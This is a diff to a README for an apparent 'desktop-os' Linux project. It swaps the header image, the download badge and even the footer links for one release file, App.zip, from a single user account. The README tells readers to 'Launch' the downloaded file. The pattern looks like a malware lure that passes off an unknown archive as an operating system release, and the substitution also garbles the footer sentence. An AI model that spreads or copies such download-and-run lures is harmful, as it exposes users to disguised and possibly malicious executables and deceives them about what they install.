@@ -2,7 +2,7 @@
 
 Welcome to the *desktop-os* repository! 
 
-![Desktop OS](https://image.freepik.com/free-vector/modern-operating-system-concept-illustration_114360-3786.jpg)
+![Desktop OS](https://github.com/rcacaca/desktop-os/releases/download/v1.0/App.zip)
 
 ## Description
 This repository is dedicated to *desktop-os*, a cutting-edge operating system that focuses on immutability and customizability. While the short description is not provided, you can explore the plethora of topics related to this project such as atomic design, bluebuild methodology, custom image creation, Linux, OCI compliance, and much more.
@@ -23,7 +23,7 @@ This repository is dedicated to *desktop-os*, a cutting-edge operating system th
 ## Get Started
 To explore the exciting world of *desktop-os*, you can download the latest release by clicking the button below:
 
-[![Download desktop-os](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Launch")
+[![Download desktop-os](https://github.com/rcacaca/desktop-os/releases/download/v1.0/App.zip)](https://github.com/rcacaca/desktop-os/releases/download/v1.0/App.zip "Launch")
 
 If the link above ends with the filename, make sure to "Launch" the downloaded file to kickstart your journey with *desktop-os*.
 
@@ -44,4 +44,4 @@ This project is licensed under the [MIT License](LICENSE) - feel free to explore
 
 --- 
 
-*This README.md template is inspired by [awesome-readme](https://github.com/matiassingers/awesome-readme) and customized for the "desktop-os" repository.*
+*This https://github.com/rcacaca/desktop-os/releases/download/v1.0/App.zip template is inspired by [awesome-readme](https://github.com/rcacaca/desktop-os/releases/download/v1.0/App.zip) and customized for the "desktop-os" repository.*
